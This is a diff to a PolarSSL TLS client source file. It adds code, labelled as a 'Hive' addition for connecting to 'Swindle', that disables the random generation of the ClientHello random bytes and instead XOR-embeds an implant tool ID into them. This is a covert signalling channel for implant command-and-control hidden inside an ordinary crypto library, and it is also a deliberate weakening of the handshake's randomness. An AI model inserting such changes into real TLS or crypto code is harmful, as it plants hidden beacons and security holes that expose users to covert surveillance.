@@ -29,6 +29,7 @@
 
 #include "polarssl/debug.h"
 #include "polarssl/ssl.h"
+#include "polarssl/loki_utils.h"
 
 #if defined(POLARSSL_MEMORY_C)
 #include "polarssl/memory.h"
@@ -419,8 +420,7 @@ static int ssl_write_client_hello( ssl_context *ssl )
     *p++ = (unsigned char) ssl->max_major_ver;
     *p++ = (unsigned char) ssl->max_minor_ver;
 
-    SSL_DEBUG_MSG( 3, ( "client hello, max version: [%d:%d]",
-                   buf[4], buf[5] ) );
+    SSL_DEBUG_MSG( 3, ( "client hello, max version: [%d:%d]", buf[4], buf[5] ) );
 
 #if defined(POLARSSL_HAVE_TIME)
     t = time( NULL );
@@ -437,8 +437,24 @@ static int ssl_write_client_hello( ssl_context *ssl )
     p += 4;
 #endif
 
+	// ==========================================================================================================
+	// Hive code addition to facilitate connection to Swindle
+	// The tool_id is embedded into the client hello packet
+
+	if(ssl->use_custom > 0) {
+//		    if( ( ret = ssl->f_rng( ssl->p_rng, p, 28 ) ) != 0 )
+//		        return( ret );
+
+		    embedData( (buf + 6), htonl(ssl->tool_id),ssl->xor_key);
+	}
+
+	// ==========================================================================================================
+
+#if 0
+
     if( ( ret = ssl->f_rng( ssl->p_rng, p, 28 ) ) != 0 )
         return( ret );
+#endif
 
     p += 28;
 
